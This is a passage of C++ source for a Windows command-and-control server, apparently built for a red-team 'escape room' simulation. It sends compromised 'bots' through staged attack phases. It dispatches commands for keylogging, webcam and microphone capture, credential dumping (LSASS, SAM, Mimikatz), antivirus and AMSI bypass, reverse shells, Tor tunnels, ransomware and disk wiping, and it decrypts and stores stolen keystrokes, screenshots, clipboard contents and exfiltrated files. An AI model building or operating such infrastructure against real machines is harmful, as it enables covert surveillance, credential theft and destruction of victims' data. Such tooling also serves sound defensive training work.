                            executeAttackPhase(clientId, 0);
                            clientTestStatus[clientId].initialCompromiseComplete = true;
                        }
                        break;
                    case 1:
                        if (!clientTestStatus[clientId].footholdComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 1: ESTABLISH FOOTHOLD ===");
                            executeAttackPhase(clientId, 1);
                            clientTestStatus[clientId].footholdComplete = true;
                        }
                        break;
                    case 2:
                        if (!clientTestStatus[clientId].privEscComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 2: PRIVILEGE ESCALATION ===");
                            executeAttackPhase(clientId, 2);
                            clientTestStatus[clientId].privEscComplete = true;
                        }
                        break;
                    case 3:
                        if (!clientTestStatus[clientId].defenseEvasionComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 3: DEFENSE EVASION ===");
                            executeAttackPhase(clientId, 3);
                            clientTestStatus[clientId].defenseEvasionComplete = true;
                        }
                        break;
                    case 4:
                        if (!clientTestStatus[clientId].surveillanceComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 4: SURVEILLANCE & CREDENTIAL ACCESS ===");
                            executeAttackPhase(clientId, 4);
                            clientTestStatus[clientId].surveillanceComplete = true;
                        }
                        break;
                    case 5:
                        if (!clientTestStatus[clientId].discoveryComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 5: DISCOVERY ===");
                            executeAttackPhase(clientId, 5);
                            clientTestStatus[clientId].discoveryComplete = true;
                        }
                        break;
                    case 6:
                        if (!clientTestStatus[clientId].lateralMovementComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 6: LATERAL MOVEMENT ===");
                            executeAttackPhase(clientId, 6);
                            clientTestStatus[clientId].lateralMovementComplete = true;
                        }
                        break;
                    case 7:
                        if (!clientTestStatus[clientId].collectionComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 7: COLLECTION ===");
                            executeAttackPhase(clientId, 7);
                            clientTestStatus[clientId].collectionComplete = true;
                        }
                        break;
                    case 8:
                        if (!clientTestStatus[clientId].exfiltrationComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 8: EXFILTRATION ===");
                            executeAttackPhase(clientId, 8);
                            clientTestStatus[clientId].exfiltrationComplete = true;
                        }
                        break;
                    case 9:
                        if (!clientTestStatus[clientId].impactComplete) {
                            logActivity("C2", "AUTO_TEST", "=== EXECUTING PHASE 9: IMPACT (RANSOMWARE SIMULATION) ===");
                            executeAttackPhase(clientId, 9);
                            clientTestStatus[clientId].impactComplete = true;
                            
                            // All tests complete
                            auto testDuration = std::chrono::duration_cast<std::chrono::minutes>(
                                now - clientTestStatus[clientId].startTime).count();
                            logActivity("C2", "TEST_COMPLETE", 
                                "=== ALL AUTOMATED TESTS COMPLETED FOR " + clientId + 
                                " - Total Duration: " + std::to_string(testDuration) + " minutes ===");
                        }
                        break;
                }
                
                clientTestStatus[clientId].lastTestTime = now;
                attackPhase = (attackPhase + 1) % 10;
                lastPhaseTime = now;
            }

            // Process queued commands
            std::vector<CommandType> commands;
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                if (clientCommandQueue.find(clientId) != clientCommandQueue.end()) {
                    commands = clientCommandQueue[clientId];
                    clientCommandQueue[clientId].clear();
                }
            }
            
            // Check for web dashboard commands
            std::string queueDir = "C:\\Windows\\Temp\\C2_CommandQueue";
            WIN32_FIND_DATAA findData;
            std::string searchPath = queueDir + "\\cmd_*_" + clientId.substr(0, clientId.find(':')) + ".json";
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    std::string cmdFile = queueDir + "\\" + findData.cFileName;
                    std::ifstream file(cmdFile);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), 
                                          std::istreambuf_iterator<char>());
                        file.close();
                        
                        // Parse JSON command (simple parsing)
                        size_t cmdPos = content.find("\"command\":\"");
                        if (cmdPos != std::string::npos) {
                            cmdPos += 11;
                            size_t cmdEnd = content.find("\"", cmdPos);
                            if (cmdEnd != std::string::npos) {
                                std::string webCommand = content.substr(cmdPos, cmdEnd - cmdPos);
                                
                                // Convert string command to CommandType
                                CommandType cmdType = CMD_BEACON;
                                // Basic & Discovery
                                if (webCommand == "SYSINFO") cmdType = CMD_SYSINFO;
                                else if (webCommand == "PROC" || webCommand == "PROCESS_LIST") cmdType = CMD_PROCESS_LIST;
                                else if (webCommand == "NETSTAT" || webCommand == "NETWORK_CONFIG") cmdType = CMD_NETWORK_CONFIG;
                                else if (webCommand == "USER_ENUM") cmdType = CMD_USER_ENUM;
                                else if (webCommand == "DOMAIN_INFO") cmdType = CMD_DOMAIN_INFO;
                                else if (webCommand == "SOFTWARE_ENUM") cmdType = CMD_SOFTWARE_ENUM;
                                
                                // Collection
                                else if (webCommand == "SCREENSHOT") cmdType = CMD_SCREENSHOT;
                                else if (webCommand == "KEYLOG:START") cmdType = CMD_KEYLOG_START;
                                else if (webCommand == "KEYLOG:DUMP") cmdType = CMD_KEYLOG_DUMP;
                                else if (webCommand == "CLIPBOARD") cmdType = CMD_CLIPBOARD;
                                else if (webCommand == "BROWSER_CREDS") cmdType = CMD_BROWSER_CREDS;
                                else if (webCommand == "FILE_SEARCH") cmdType = CMD_FILE_SEARCH;
                                else if (webCommand == "WEBCAM:CAPTURE") cmdType = CMD_WEBCAM_CAPTURE;
                                else if (webCommand == "MIC:RECORD:START") cmdType = CMD_MICROPHONE_RECORD;
                                else if (webCommand == "SCREEN_RECORD") cmdType = CMD_SCREEN_RECORD;
                                
                                // Execution
                                else if (webCommand == "SHELL_EXEC") cmdType = CMD_SHELL_EXEC;
                                else if (webCommand == "POWERSHELL") cmdType = CMD_POWERSHELL;
                                else if (webCommand == "INJECT_PROCESS") cmdType = CMD_INJECT_PROCESS;
                                else if (webCommand == "REVERSE_SHELL") cmdType = CMD_REVERSE_SHELL;
                                else if (webCommand == "REMOTE_DESKTOP") cmdType = CMD_REMOTE_DESKTOP;
                                
                                // Persistence
                                else if (webCommand == "PERSISTENCE" || webCommand == "REGISTRY_PERSIST") cmdType = CMD_REGISTRY_PERSIST;
                                else if (webCommand == "INSTALL_SERVICE") cmdType = CMD_INSTALL_SERVICE;
                                else if (webCommand == "SCHEDULED_TASK") cmdType = CMD_SCHEDULED_TASK;
                                else if (webCommand == "WMI_PERSIST") cmdType = CMD_WMI_PERSIST;
                                else if (webCommand == "STARTUP_FOLDER") cmdType = CMD_STARTUP_FOLDER;
                                else if (webCommand == "BOOTKIT_INSTALL") cmdType = CMD_BOOTKIT_INSTALL;
                                
                                // Lateral Movement
                                else if (webCommand == "PORT_SCAN") cmdType = CMD_PORT_SCAN;
                                else if (webCommand == "SMB_SCAN") cmdType = CMD_SMB_SCAN;
                                else if (webCommand == "PSEXEC") cmdType = CMD_PSEXEC;
                                else if (webCommand == "WMI_EXEC") cmdType = CMD_WMI_EXEC;
                                else if (webCommand == "RDP_EXEC") cmdType = CMD_RDP_EXEC;
                                else if (webCommand == "PASS_THE_HASH") cmdType = CMD_PASS_THE_HASH;
                                else if (webCommand == "MIMIKATZ") cmdType = CMD_MIMIKATZ_EXEC;
                                
                                // Privilege Escalation
                                else if (webCommand == "ELEVATE" || webCommand == "UAC_BYPASS") cmdType = CMD_UAC_BYPASS;
                                else if (webCommand == "TOKEN_STEAL") cmdType = CMD_TOKEN_STEAL;
                                else if (webCommand == "EXPLOIT_SUGGESTER") cmdType = CMD_EXPLOIT_SUGGESTER;
                                else if (webCommand == "LSASS_DUMP") cmdType = CMD_LSASS_DUMP;
                                else if (webCommand == "SAM_DUMP") cmdType = CMD_SAM_DUMP;
                                
                                // Defense Evasion
                                else if (webCommand == "DISABLE_AV") cmdType = CMD_DISABLE_AV;
                                else if (webCommand == "CLEARLOG" || webCommand == "CLEAR_LOGS") cmdType = CMD_CLEAR_LOGS;
                                else if (webCommand == "TIMESTOMP") cmdType = CMD_TIMESTOMP;
                                else if (webCommand == "PROCESS_HOLLOW") cmdType = CMD_PROCESS_HOLLOW;
                                else if (webCommand == "ROOTKIT_INSTALL") cmdType = CMD_ROOTKIT_INSTALL;
                                else if (webCommand == "AMSI_BYPASS") cmdType = CMD_AMSI_BYPASS;
                                else if (webCommand == "ETW_DISABLE") cmdType = CMD_ETW_DISABLE;
                                
                                // Exfiltration
                                else if (webCommand == "STAGE_FILES") cmdType = CMD_STAGE_FILES;
                                else if (webCommand == "COMPRESS_DATA") cmdType = CMD_COMPRESS_DATA;
                                else if (webCommand == "EXFIL_HTTP") cmdType = CMD_EXFIL_HTTP;
                                else if (webCommand == "EXFIL_DNS") cmdType = CMD_EXFIL_DNS;
                                else if (webCommand == "EXFIL_ICMP") cmdType = CMD_EXFIL_ICMP;
                                else if (webCommand == "EXFIL_EMAIL") cmdType = CMD_EXFIL_EMAIL;
                                else if (webCommand == "CLOUD_UPLOAD") cmdType = CMD_CLOUD_UPLOAD;
                                
                                // Impact
                                else if (webCommand == "RANSOMWARE") cmdType = CMD_RANSOMWARE;
                                else if (webCommand == "WIPE_DISK") cmdType = CMD_WIPE_DISK;
                                else if (webCommand == "CORRUPT_BOOT") cmdType = CMD_CORRUPT_BOOT;
                                else if (webCommand == "CRYPTO_MINER") cmdType = CMD_CRYPTO_MINER;
                                
                                // Advanced Network Evasion
                                else if (webCommand == "TOR_CONNECT") cmdType = CMD_TOR_CONNECT;
                                else if (webCommand == "TOR_API_CALL") cmdType = CMD_TOR_API_CALL;
                                else if (webCommand == "REVERSE_SSH") cmdType = CMD_REVERSE_SSH;
                                else if (webCommand == "NETCAT_TUNNEL") cmdType = CMD_NETCAT_TUNNEL;
                                else if (webCommand == "SOCAT_RELAY") cmdType = CMD_SOCAT_RELAY;
                                
                                commands.push_back(cmdType);
                                logActivity("C2", "WEB_COMMAND", "Received " + webCommand + " from web dashboard for " + clientId);
                            }
                        }
                        
                        // Delete processed command file
                        DeleteFileA(cmdFile.c_str());
                    }
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }

            for (auto cmd : commands) {
                generateC2Traffic(clientSocket, clientId, cmd);

                // Execute specific command handlers
                switch (cmd) {
                case CMD_REVERSE_SHELL:
                case CMD_SHELL_EXEC:
                    executeRemoteShell(clientSocket, clientId);
                    break;

                case CMD_REMOTE_DESKTOP:
                    executeRemoteDesktop(clientSocket, clientId);
                    break;

                case CMD_KEYLOG_START:
                    executeKeylogger(clientSocket, clientId);
                    break;
                    
                case CMD_KEYLOG_DUMP:
                    executeKeyloggerDump(clientSocket, clientId);
                    break;
                    
                case CMD_SCREENSHOT:
                    executeScreenshotCapture(clientSocket, clientId);
                    break;

                case CMD_WEBCAM_CAPTURE:
                    executeWebcamCapture(clientSocket, clientId);
                    break;
                    
                case CMD_TOR_CONNECT:
                    executeTorConnect(clientSocket, clientId);
                    break;
                    
                case CMD_TOR_API_CALL:
                    executeTorApiCall(clientSocket, clientId);
                    break;
                    
                case CMD_REVERSE_SSH:
                    executeReverseSSH(clientSocket, clientId);
                    break;
                    
                case CMD_NETCAT_TUNNEL:
                    executeNetcatTunnel(clientSocket, clientId);
                    break;
                    
                case CMD_SOCAT_RELAY:
                    executeSocatRelay(clientSocket, clientId);
                    break;

                case CMD_MICROPHONE_RECORD:
                    executeMicrophoneRecord(clientSocket, clientId);
                    break;

                case CMD_SCREEN_RECORD:
                    executeScreenRecord(clientSocket, clientId);
                    break;

                case CMD_MIMIKATZ_EXEC:
                    executeMimikatz(clientSocket, clientId);
                    break;

                case CMD_AMSI_BYPASS:
                case CMD_ETW_DISABLE:
                case CMD_DISABLE_AV:
                    executeDefenseBypass(clientSocket, clientId);
                    break;

                case CMD_CRYPTO_MINER:
                    executeCryptoMiner(clientSocket, clientId);
                    break;

                case CMD_BOOTKIT_INSTALL:
                    executeBootkit(clientSocket, clientId);
                    break;

                case CMD_EXFIL_HTTP:
                case CMD_EXFIL_DNS:
                case CMD_EXFIL_EMAIL:
                case CMD_CLOUD_UPLOAD:
                    simulateDataExfiltration(clientSocket, clientId);
                    break;

                case CMD_PSEXEC:
                case CMD_WMI_EXEC:
                case CMD_PASS_THE_HASH:
                    simulateLateralMovement(clientSocket, clientId);
                    break;

                default:
                    // Standard command execution
                    break;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }

            // Check for client responses
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(clientSocket, &readSet);

            timeval timeout;
            timeout.tv_sec = 0;
            timeout.tv_usec = 500000;

            if (select(0, &readSet, NULL, NULL, &timeout) > 0) {
                // Handle potentially large data transfers
                std::string totalData;
                char response[8192];
                bool connectionClosed = false;
                
                // Keep reading until no more data
                bool moreData = true;
                while (moreData) {
                    int bytes = recv(clientSocket, response, sizeof(response) - 1, 0);
                    if (bytes > 0) {
                        response[bytes] = '\0';
                        totalData += std::string(response, bytes);
                        
                        // Debug: Log each chunk
                        logActivity("DEBUG", "DATA_CHUNK_RECEIVED", "From " + clientId + " - Chunk size: " + std::to_string(bytes) + " - Total so far: " + std::to_string(totalData.length()));
                        
                        // Check if there's more data waiting
                        fd_set readSetCheck;
                        FD_ZERO(&readSetCheck);
                        FD_SET(clientSocket, &readSetCheck);
                        timeval quickTimeout = {0, 10000}; // 10ms timeout
                        
                        if (select(0, &readSetCheck, NULL, NULL, &quickTimeout) <= 0) {
                            moreData = false; // No more data waiting
                        }
                    } else if (bytes == 0) {
                        connectionClosed = true;
                        moreData = false;
                    } else {
                        moreData = false;
                    }
                }
                
                if (totalData.length() > 0) {
                    // Debug: Log raw data received
                    size_t previewLen = totalData.length() > 50 ? 50 : totalData.length();
                    logActivity("DEBUG", "RAW_DATA_RECEIVED", "From " + clientId + " - Total bytes: " + std::to_string(totalData.length()) + " - First 50 chars: " + totalData.substr(0, previewLen));
                    
                    std::string decrypted = xorEncrypt(totalData);
                    
                    // Debug: Log decrypted data
                    std::string preview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
                    logActivity("DEBUG", "DECRYPTED_DATA", "From " + clientId + " - Length: " + std::to_string(decrypted.length()) + " - Preview: " + preview);
                    
                    // Enhanced visibility for client responses
                    if (decrypted.find("RDP:") == 0 || decrypted.find("SSH:") == 0 || 
                        decrypted.find("NETCAT:") == 0 || decrypted.find("SOCAT:") == 0 ||
                        decrypted.find("TOR") == 0) {
                        std::cout << "\n\033[1;36m[+] CLIENT RESPONSE: " << preview << "\033[0m\n";
                    }
                    
                    logActivity("C2", "CLIENT_RESPONSE", "From " + clientId + ": " + preview);

                    // Process specific response types - check for ANY data transfer
                    bool dataProcessed = false;
                    
                    if (decrypted.find("SCREENSHOT:") == 0 || decrypted.find("SCREEN:") == 0) {
                        // Handle screenshot data
                        logActivity("COLLECTION", "SCREENSHOT_RECEIVED", "Processing screenshot data from " + clientId);
                        dataProcessed = true;
                        
                        // Create screenshots directory
                        CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
                        
                        if (decrypted.find("SCREENSHOT:DATA:START") == 0 || decrypted.find("SCREEN:DATA:") == 0) {
                            // Extract screenshot data
                            size_t startPos = decrypted.find("Data:") + 5;
                            size_t endPos = decrypted.find("\nSCREENSHOT:DATA:END");
                            
                            if (startPos != std::string::npos && endPos != std::string::npos) {
                                // Extract metadata
                                std::string resolution = "";
                                std::string timestamp = "";
                                std::string origFilename = "";
                                
                                size_t resPos = decrypted.find("Resolution:");
                                if (resPos != std::string::npos) {
                                    resPos += 11;
                                    size_t resEnd = decrypted.find("\n", resPos);
                                    if (resEnd != std::string::npos) {
                                        resolution = decrypted.substr(resPos, resEnd - resPos);
                                    }
                                }
                                
                                size_t timePos = decrypted.find("Timestamp:");
                                if (timePos != std::string::npos) {
                                    timePos += 10;
                                    size_t timeEnd = decrypted.find("\n", timePos);
                                    if (timeEnd != std::string::npos) {
                                        timestamp = decrypted.substr(timePos, timeEnd - timePos);
                                    }
                                }
                                
                                size_t filePos = decrypted.find("Filename:");
                                if (filePos != std::string::npos) {
                                    filePos += 9;
                                    size_t fileEnd = decrypted.find("\n", filePos);
                                    if (fileEnd != std::string::npos) {
                                        origFilename = decrypted.substr(filePos, fileEnd - filePos);
                                    }
                                }
                                
                                // Get base64 data
                                std::string base64Data = decrypted.substr(startPos, endPos - startPos);
                                
                                // Create screenshots directory
                                CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
                                
                                // Decode base64 to binary
                                std::vector<unsigned char> decodedData = base64Decode(base64Data);
                                
                                // Save screenshot as BMP file (client captures in BMP format)
                                std::string screenshotFile = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
                                                           clientId.substr(0, clientId.find(':')) + "_" +
                                                           std::to_string(GetTickCount()) + "_screenshot.bmp";
                                
                                std::ofstream screenshot(screenshotFile, std::ios::binary);
                                if (screenshot.is_open()) {
                                    screenshot.write(reinterpret_cast<const char*>(decodedData.data()), decodedData.size());
                                    screenshot.close();
                                    logActivity("COLLECTION", "SCREENSHOT_SAVED", "Screenshot saved as BMP to " + screenshotFile);
                                    
                                    // Log file size for verification
                                    logActivity("COLLECTION", "SCREENSHOT_SIZE", 
                                               "File size: " + std::to_string(decodedData.size()) + " bytes");
                                }
                                
                                // Also save the base64 version for reference
                                std::string base64File = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
                                                       clientId.substr(0, clientId.find(':')) + "_" +
                                                       std::to_string(GetTickCount()) + "_screenshot_base64.txt";
                                
                                std::ofstream b64out(base64File);
                                if (b64out.is_open()) {
                                    b64out << base64Data;
                                    b64out.close();
                                }
                                
                                // Save metadata
                                std::string metaFile = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
                                                     clientId.substr(0, clientId.find(':')) + "_" +
                                                     std::to_string(GetTickCount()) + "_meta.txt";
                                
                                std::ofstream meta(metaFile);
                                if (meta.is_open()) {
                                    meta << "Client: " << clientId << std::endl;
                                    meta << "Hostname: " << client.hostname << std::endl;
                                    meta << "Username: " << client.username << std::endl;
                                    meta << "Timestamp: " << timestamp << std::endl;
                                    meta << "Resolution: " << resolution << std::endl;
                                    meta << "Original Path: " << origFilename << std::endl;
                                    meta << "Data File: " << screenshotFile << std::endl;
                                    meta.close();
                                    
                                    logActivity("EXFIL", "SCREENSHOT_STORED", "Screenshot and metadata saved");
                                }
                            }
                        }
                        else if (decrypted.find("SCREENSHOT:SAVED:") == 0) {
                            // Legacy format - just log it
                            std::string filename = decrypted.substr(17);
                            logActivity("COLLECTION", "SCREENSHOT", "Screenshot saved on client: " + filename);
                        }
                        else {
                            // Try to extract any base64 data or file content
                            if (decrypted.length() > 50) { // Likely contains actual data
                                std::string filename = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
                                                     clientId.substr(0, clientId.find(':')) + "_" +
                                                     std::to_string(GetTickCount()) + "_screenshot.txt";
                                
                                std::ofstream file(filename);
                                if (file.is_open()) {
                                    file << "=== SCREENSHOT DATA FROM " << clientId << " ===" << std::endl;
                                    file << "Timestamp: " << std::time(nullptr) << std::endl;
                                    file << "Data Length: " << decrypted.length() << std::endl;
                                    file << "=== RAW DATA ===" << std::endl;
                                    file << decrypted << std::endl;
                                    file.close();
                                    
                                    logActivity("COLLECTION", "SCREENSHOT_SAVED", "Screenshot data saved to: " + filename);
                                }
                            } else {
                                logActivity("DEBUG", "SCREENSHOT_UNHANDLED", "Short screenshot response: " + decrypted);
                            }
                        }
                    }
                    else if (decrypted.find("KEYLOG:") == 0 || decrypted.find("KEYLOGGER:") == 0) {
                        // Handle keylogger data
                        logActivity("COLLECTION", "KEYLOG_RECEIVED", "Processing keylog data from " + clientId);
                        dataProcessed = true;
                        
                        // Create keylogs directory
                        CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);
                        
                        if (decrypted.find("KEYLOG:DUMP:START") == 0 || decrypted.find("KEYLOGGER:DATA:") == 0) {
                            // Create keylog directory
                            CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);
                            
                            // Extract keylog data
                            size_t startPos = decrypted.find('\n') + 1;
                            size_t endPos = decrypted.find("\nKEYLOG:DUMP:END");
                            
                            if (startPos != std::string::npos && endPos != std::string::npos) {
                                std::string keylogData = decrypted.substr(startPos, endPos - startPos);
                                
                                // Log actual captured keystrokes
                                logActivity("COLLECTION", "KEYLOG_RECEIVED", "Real keystrokes captured from " + clientId);
                                
                                // Parse and log individual window captures
                                std::istringstream stream(keylogData);
                                std::string line;
                                while (std::getline(stream, line)) {
                                    if (line.find("[") == 0 && line.find("Window:") != std::string::npos) {
                                        // This is a window title line
                                        logActivity("KEYLOG", "WINDOW_FOCUS", line);
                                    }
                                }
                                
                                // Save keylog data to file
                                std::string keylogFile = "C:\\Windows\\Temp\\C2_Keylogs\\" + 
                                                       clientId.substr(0, clientId.find(':')) + "_" +
                                                       std::to_string(GetTickCount()) + "_keylog.txt";
                                
                                std::ofstream klog(keylogFile);
                                if (klog.is_open()) {
                                    klog << "=== REAL KEYLOGGER CAPTURE ===" << std::endl;
                                    klog << "Client: " << clientId << std::endl;
                                    klog << "Hostname: " << client.hostname << std::endl;
                                    klog << "Username: " << client.username << std::endl;
                                    klog << "Timestamp: " << std::time(nullptr) << std::endl;
                                    klog << "=== ACTUAL CAPTURED KEYSTROKES ===" << std::endl;
                                    klog << keylogData << std::endl;
                                    klog.close();
                                    
                                    logActivity("EXFIL", "KEYLOG_STORED", "Real keylog saved to " + keylogFile);
                                    
                                    // Also append to master keylog file
                                    std::ofstream masterLog("C:\\Windows\\Temp\\C2_Keylogs\\MASTER_KEYLOG.txt", std::ios::app);
                                    if (masterLog.is_open()) {
                                        masterLog << "\n\n[REAL CAPTURE - " << clientId << " @ " << std::time(nullptr) << "]\n";
                                        masterLog << keylogData << std::endl;
                                        masterLog.close();
                                    }
                                }
                            }
                        }
                        else if (decrypted.find("KEYLOGGER:STARTED") == 0) {
                            logActivity("KEYLOG", "STARTED", "Keylogger successfully started on " + clientId);
                        }
                        else {
                            // Save any keylog data regardless of format
                            if (decrypted.length() > 30) { // Likely contains keylog data
                                std::string filename = "C:\\Windows\\Temp\\C2_Keylogs\\" + 
                                                     clientId.substr(0, clientId.find(':')) + "_" +
                                                     std::to_string(GetTickCount()) + "_keylog.txt";
                                
                                std::ofstream file(filename);
                                if (file.is_open()) {
                                    file << "=== KEYLOG DATA FROM " << clientId << " ===" << std::endl;
                                    file << "Timestamp: " << std::time(nullptr) << std::endl;
                                    file << "Data Length: " << decrypted.length() << std::endl;
                                    file << "=== CAPTURED KEYSTROKES ===" << std::endl;
                                    file << decrypted << std::endl;
                                    file.close();
                                    
                                    logActivity("COLLECTION", "KEYLOG_SAVED", "Keylog data saved to: " + filename);
                                }
                            }
                        }
                    }
                    else if (decrypted.find("EXFIL:") == 0) {
                        // Handle exfiltrated data
                        if (decrypted.find("EXFIL:HTTP:DATA:") == 0) {
                            CreateDirectoryA("C:\\Windows\\Temp\\C2_Exfiltrated", NULL);
                            
                            std::string exfilFile = "C:\\Windows\\Temp\\C2_Exfiltrated\\" + 
                                                  clientId.substr(0, clientId.find(':')) + "_" +
                                                  std::to_string(GetTickCount()) + "_exfil.b64";
                            
                            std::ofstream exfil(exfilFile);
                            if (exfil.is_open()) {
                                exfil << decrypted.substr(16) << std::endl;
                                exfil.close();
                                logActivity("EXFIL", "DATA_STORED", "Exfiltrated data saved to " + exfilFile);
                            }
                        }
                    }
                    else if (decrypted.find("CLIPBOARD:") == 0) {
                        // Handle clipboard data
                        CreateDirectoryA("C:\\Windows\\Temp\\C2_Clipboard", NULL);
                        
                        std::string clipFile = "C:\\Windows\\Temp\\C2_Clipboard\\" + 
                                             clientId.substr(0, clientId.find(':')) + "_" +
                                             std::to_string(GetTickCount()) + "_clipboard.txt";
                        
                        std::ofstream clip(clipFile);
                        if (clip.is_open()) {
                            clip << "Client: " << clientId << std::endl;
                            clip << "Timestamp: " << std::time(nullptr) << std::endl;
                            clip << "=== CLIPBOARD CONTENT ===" << std::endl;
                            clip << decrypted << std::endl;
                            clip.close();
                            logActivity("COLLECTION", "CLIPBOARD_STORED", "Clipboard data saved to " + clipFile);
                        }
                    }

                    // Catch-all handler for any unrecognized data
                    if (!dataProcessed && decrypted.length() > 20) {
                        logActivity("DEBUG", "UNRECOGNIZED_DATA", "Saving unrecognized data from " + clientId + " - Length: " + std::to_string(decrypted.length()));
                        
                        // Create general data directory
                        CreateDirectoryA("C:\\Windows\\Temp\\C2_UnknownData", NULL);
                        
                        std::string filename = "C:\\Windows\\Temp\\C2_UnknownData\\" + 
                                             clientId.substr(0, clientId.find(':')) + "_" +
                                             std::to_string(GetTickCount()) + "_unknown.txt";
                        
                        std::ofstream file(filename);
                        if (file.is_open()) {
                            file << "=== UNKNOWN DATA FROM " << clientId << " ===" << std::endl;
                            file << "Timestamp: " << std::time(nullptr) << std::endl;
                            file << "Data Length: " << decrypted.length() << std::endl;
                            file << "First 200 chars: " << decrypted.substr(0, 200) << std::endl;
                            file << "=== FULL DATA ===" << std::endl;
                            file << decrypted << std::endl;
                            file.close();
                            
                            logActivity("COLLECTION", "UNKNOWN_DATA_SAVED", "Unknown data saved to: " + filename);
                        }
                    }
                    
                    // Store collected data
                    {
                        std::lock_guard<std::mutex> lock(clientsMutex);
                        connectedClients[clientId].collectedData["last_response"] = decrypted;
                    }
                }
                
                // Handle connection close
                if (connectionClosed) {
                    logActivity("C2", "DISCONNECT", "Bot disconnected: " + clientId);
                    client.isActive = false;
                }
            }

            // Beacon interval with jitter
            std::uniform_int_distribution<> dis(BEACON_INTERVAL - 2, BEACON_INTERVAL + 5);
            std::this_thread::sleep_for(std::chrono::seconds(dis(gen)));
        }

        // Cleanup
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            connectedClients[clientId].isActive = false;
        }

        closesocket(clientSocket);
        logActivity("C2", "CLEANUP", "Removed bot: " + clientId);
        
        // Update status file when client disconnects
        writeC2StatusToFile();
    }

    // Advanced dashboard with attack metrics
    void dashboardThread() {
        while (serverRunning) {
            std::this_thread::sleep_for(std::chrono::seconds(15));

            system("cls");

            // Header
            std::cout << "\033[31m"; // Red color
            std::cout << "\n+==============================================================+\n";
            std::cout << "|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |\n";
            std::cout << "+==============================================================+\n";
            std::cout << "\033[0m"; // Reset color

            std::lock_guard<std::mutex> lock(clientsMutex);

            int activeCount = 0;
            int elevatedCount = 0;
            int totalBeacons = 0;

            for (const auto& [id, client] : connectedClients) {
                if (client.isActive) {
                    activeCount++;
                    if (client.isElevated) elevatedCount++;
                    totalBeacons += client.beaconCount;
                }
            }

            // Stats section
            std::cout << "\033[32m"; // Green color
            std::cout << "| Active Bots: " << std::setw(8) << activeCount
                << "  |  Elevated: " << std::setw(8) << elevatedCount
                << "  |  Beacons: " << std::setw(8) << totalBeacons << " |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "|                        CONNECTED BOTS                        |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color

            // Connected clients
            for (const auto& [id, client] : connectedClients) {
                if (client.isActive) {
                    auto now = std::chrono::system_clock::now();
                    auto uptime = std::chrono::duration_cast<std::chrono::minutes>(now - client.firstSeen).count();
                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(now - client.lastSeen).count();

                    std::cout << "| " << std::left << std::setw(15) << client.hostname
                        << " | " << std::setw(15) << client.ipAddress
                        << " | " << std::setw(12) << client.username
                        << " | Up: " << std::setw(3) << uptime << "m"
                        << " | LS: " << std::setw(3) << lastSeen << "s |\n";
                }
            }

            // Attack indicators and test status
            std::cout << "\033[33m"; // Yellow color
            std::cout << "+==============================================================+\n";
            std::cout << "|                     ATTACK INDICATORS                        |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|\n";
            std::cout << "| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |\n";
            std::cout << "| [ACTIVE] Process Injection       | [READY]  Ransomware       |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            
            // Show test execution status for each client
            if (!clientTestStatus.empty()) {
                std::cout << "|                    TEST EXECUTION STATUS                     |\n";
                std::cout << "+--------------------------------------------------------------+\n";
                for (const auto& [id, status] : clientTestStatus) {
                    if (connectedClients.find(id) != connectedClients.end() && connectedClients[id].isActive) {
                        std::string host = connectedClients[id].hostname;
                        if (host.length() > 12) host = host.substr(0, 12);
                        
                        int completedPhases = 0;
                        if (status.initialCompromiseComplete) completedPhases++;
                        if (status.footholdComplete) completedPhases++;
                        if (status.privEscComplete) completedPhases++;
                        if (status.defenseEvasionComplete) completedPhases++;
                        if (status.surveillanceComplete) completedPhases++;
                        if (status.discoveryComplete) completedPhases++;
                        if (status.lateralMovementComplete) completedPhases++;
                        if (status.collectionComplete) completedPhases++;
                        if (status.exfiltrationComplete) completedPhases++;
                        if (status.impactComplete) completedPhases++;
                        
                        std::cout << "| " << std::left << std::setw(12) << host 
                                  << " | Progress: " << std::setw(2) << completedPhases << "/10 phases"
                                  << " | Status: " << std::setw(20) 
                                  << (completedPhases == 10 ? "COMPLETE" : "TESTING IN PROGRESS") << " |\n";
                    }
                }
            }
            
            std::cout << "+==============================================================+\n";
            std::cout << "\033[0m"; // Reset color

            // Control legend - ALWAYS VISIBLE
            std::cout << "\033[36m"; // Cyan color
            std::cout << "\n+----------------------- CONTROL LEGEND -----------------------+\n";
            std::cout << "| MANUAL MODE ACTIVE - Press H for full help menu             |\n";
            std::cout << "| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |\n";
